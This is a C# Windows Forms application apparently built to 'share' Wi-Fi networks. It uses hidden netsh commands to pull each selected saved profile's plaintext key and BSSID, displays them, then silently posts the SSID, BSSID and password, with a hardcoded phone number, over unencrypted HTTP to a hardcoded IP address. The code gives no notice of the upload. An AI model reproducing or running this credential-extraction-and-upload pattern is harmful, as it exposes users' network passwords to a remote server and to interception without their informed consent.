using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using PoziomLabs;
using System.Net;
using System.Collections.Specialized;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string bssid, password;
        private void Form1_Load(object sender, EventArgs e)
        {
            Netsh netsh = new Netsh();
            string[] profiles = netsh.SavedProfileList().ToArray();
            checkedListBox2.Items.AddRange(profiles);
            checkedListBox2.CheckOnClick = true;
        }

        private void sideNav1_Click(object sender, EventArgs e)
        {

        }

        private void Share_Click(object sender, EventArgs e)
        {
            Netsh netsh = new Netsh();
            
            for (int i = 0; i < checkedListBox2.Items.Count; i++)
            {
                if (checkedListBox2.GetItemChecked(i) == true)
                {
                    System.Diagnostics.Process process2 = new System.Diagnostics.Process();
                    System.Diagnostics.ProcessStartInfo satrtInf = new System.Diagnostics.ProcessStartInfo();
                    satrtInf.UseShellExecute = false;
                    satrtInf.RedirectStandardOutput = true;
                    satrtInf.RedirectStandardError = true;
                    satrtInf.CreateNoWindow = true;
                    satrtInf.FileName = "cmd.exe";
                    satrtInf.Arguments = "/C " + "netsh wlan show networks mode=\"bssid\"";
                    process2.StartInfo = satrtInf;
                    process2.Start();
                    bssid = process2.StandardOutput.ReadToEnd();

                    if(bssid.IndexOf(checkedListBox2.Items[i].ToString())!=-1)
                    {
                        bssid = bssid.Substring(bssid.IndexOf(checkedListBox2.Items[i].ToString()));
                        bssid = bssid.Substring(bssid.IndexOf("BSSID"));
                        bssid = bssid.Substring(bssid.IndexOf(": ") + 2, bssid.IndexOf('\r') - (bssid.IndexOf(": ") + 2));

                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.UseShellExecute = false;
                        startInfo.RedirectStandardOutput = true;
                        startInfo.RedirectStandardError = true;
                        startInfo.CreateNoWindow = true;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "/C " + "netsh wlan show profile name=\"" + checkedListBox2.Items[i].ToString() + "\" key=\"clear\"";
                        process.StartInfo = startInfo;
                        process.Start();
                        password = process.StandardOutput.ReadToEnd();
                        password = password.Substring(password.IndexOf("Key Content"));
                        password = password.Substring(password.IndexOf(": ") + 2, password.IndexOf('\r') - (password.IndexOf(": ") + 2));
                        //MessageBox.Show(pass);

                        MessageBox.Show("Password: " + password + "\n\nBSSID: " + bssid);

                        using (var client = new WebClient())
                        {
                            var values = new NameValueCollection();
                            values["user_contact"] = "9434348505";
                            values["ssid"] = checkedListBox2.Items[i].ToString();
                            values["bssid"] = bssid;
                            values["password"] = password;

                            var response = client.UploadValues("http://52.27.54.85/rad_app/wifi_info.php", values);

                            //var responseString = Encoding.Default.GetString(response);

                            //MessageBox.Show(responseString);

                        }
                    } 
                }
            }
        }
    }
}
